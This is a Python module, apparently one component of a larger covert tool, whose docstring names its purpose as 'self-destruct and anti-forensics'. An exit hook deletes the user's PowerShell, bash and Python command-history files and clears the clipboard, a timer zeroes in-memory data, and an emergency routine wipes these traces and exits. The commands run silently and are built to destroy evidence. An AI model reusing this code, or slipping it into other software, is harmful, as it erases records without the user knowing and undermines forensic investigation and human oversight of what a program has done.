"""Self-destruct and anti-forensics - everything stays in memory"""

import os
import sys
import gc
import platform
import subprocess
import ctypes
import shutil
import threading
import time

class SelfDestruct:
    def __init__(self):
        self._destroy_timers = []
        self._cleanup_on_exit()
    
    def _cleanup_on_exit(self):
        import atexit
        atexit.register(self.wipe_all)
    
    def schedule_destroy(self, data, seconds=30):
        """Destroy a piece of data after N seconds"""
        def destroy():
            time.sleep(seconds)
            if isinstance(data, bytearray) or isinstance(data, list):
                for i in range(len(data)):
                    data[i] = 0
            elif isinstance(data, dict):
                data.clear()
            gc.collect()
        
        t = threading.Thread(target=destroy, daemon=True)
        t.start()
        self._destroy_timers.append(t)
    
    def wipe_all(self):
        """Full wipe of everything"""
        # Wipe command history
        if platform.system() == "Windows":
            try:
                os.system("del /f /q %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul")
                os.system("del /f /q %USERPROFILE%\\.python_history 2>nul")
            except: pass
        else:
            try:
                os.system("history -c 2>/dev/null")
                os.system("rm -f ~/.bash_history 2>/dev/null")
                os.system("rm -f ~/.python_history 2>/dev/null")
            except: pass
        
        # Wipe clipboard
        if platform.system() == "Windows":
            try:
                ctypes.windll.user32.OpenClipboard(None)
                ctypes.windll.user32.EmptyClipboard()
                ctypes.windll.user32.CloseClipboard()
            except: pass
        else:
            try:
                subprocess.run(["xclip", "-i", "/dev/null"], capture_output=True)
                subprocess.run(["xsel", "-c"], capture_output=True)
            except: pass
        
        # Force garbage collection
        gc.collect()
        
        print("[*] All memory traces wiped")
    
    def emergency_wipe(self):
        self.wipe_all()
        sys.exit(0)